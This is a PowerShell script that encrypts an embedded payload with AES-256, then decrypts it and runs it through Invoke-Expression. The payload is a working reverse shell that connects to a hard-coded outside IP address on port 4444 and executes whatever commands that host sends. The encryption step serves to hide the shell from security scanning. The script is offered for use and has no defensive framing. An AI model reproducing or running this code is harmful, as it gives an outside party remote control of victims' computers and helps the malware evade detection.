# Step 1: Define the encryption key (replace with your own key)
# The key must be exactly 32 bytes (256 bits) for AES-256.
$EncryptionKey = "YourEncryptionKey"  # Replace with your own key
$EncryptionKeyBytes = [System.Text.Encoding]::UTF8.GetBytes(
    $EncryptionKey.PadRight(32, '0').Substring(0, 32)  # Ensure key is 32 bytes (FIXED: Added closing ")" here
)

# Step 2: Define the script you want to encrypt (replace with your own script)
$Script = @'
$LHOST = "144.202.29.47"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
'@

# Step 3: Function to encrypt the script using AES-256
function Encrypt-Script {
    param (
        [string]$Script,  # The script to encrypt
        [byte[]]$Key      # The encryption key (32 bytes)
    )
    # Create an AES object
    $AES = [System.Security.Cryptography.Aes]::Create()
    $AES.Key = $Key
    $AES.GenerateIV()  # Generate a random Initialization Vector (IV)
    
    # Create an encryptor and encrypt the script
    $Encryptor = $AES.CreateEncryptor($AES.Key, $AES.IV)
    $ScriptBytes = [System.Text.Encoding]::UTF8.GetBytes($Script)
    $EncryptedBytes = $Encryptor.TransformFinalBlock($ScriptBytes, 0, $ScriptBytes.Length)
    
    # Prepend the IV to the encrypted data and convert to Base64
    $EncryptedScript = [System.Convert]::ToBase64String($AES.IV + $EncryptedBytes)
    return $EncryptedScript
}

# Step 4: Function to decrypt and execute the script using AES-256
function Decrypt-And-Execute-Script {
    param (
        [string]$EncryptedScript,  # The encrypted script (Base64-encoded)
        [byte[]]$Key               # The encryption key (32 bytes)
    )
    # Convert the Base64-encoded encrypted script to bytes
    $EncryptedBytes = [System.Convert]::FromBase64String($EncryptedScript)
    
    # Create an AES object
    $AES = [System.Security.Cryptography.Aes]::Create()
    $AES.Key = $Key
    $AES.IV = $EncryptedBytes[0..15]  # Extract the IV from the first 16 bytes
    
    # Create a decryptor and decrypt the script
    $Decryptor = $AES.CreateDecryptor($AES.Key, $AES.IV)
    $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 16, $EncryptedBytes.Length - 16)
    
    # Convert the decrypted bytes to a string and execute the script
    $DecryptedScript = [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
    Invoke-Expression $DecryptedScript
}

# Step 5: Encrypt the script
$EncryptedScript = Encrypt-Script -Script $Script -Key $EncryptionKeyBytes
Write-Output "Encrypted script: $EncryptedScript"

# Step 6: Decrypt and execute the script
Write-Output "Decrypting and executing the script..."
Decrypt-And-Execute-Script -EncryptedScript $EncryptedScript -Key $EncryptionKeyBytes